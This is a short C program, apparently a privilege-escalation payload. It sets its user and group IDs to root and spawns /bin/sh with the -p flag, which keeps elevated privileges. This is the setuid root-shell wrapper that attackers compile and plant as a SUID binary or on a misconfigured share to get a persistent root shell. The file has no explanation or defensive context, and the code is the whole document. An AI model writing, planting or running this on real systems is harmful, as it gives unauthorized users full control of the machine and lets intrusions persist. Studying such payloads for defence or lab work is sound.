#include <unistd.h>
int main() {
    setuid(0);
    setgid(0);
    execl("/bin/sh", "sh", "-p", NULL);
    return 0;
}
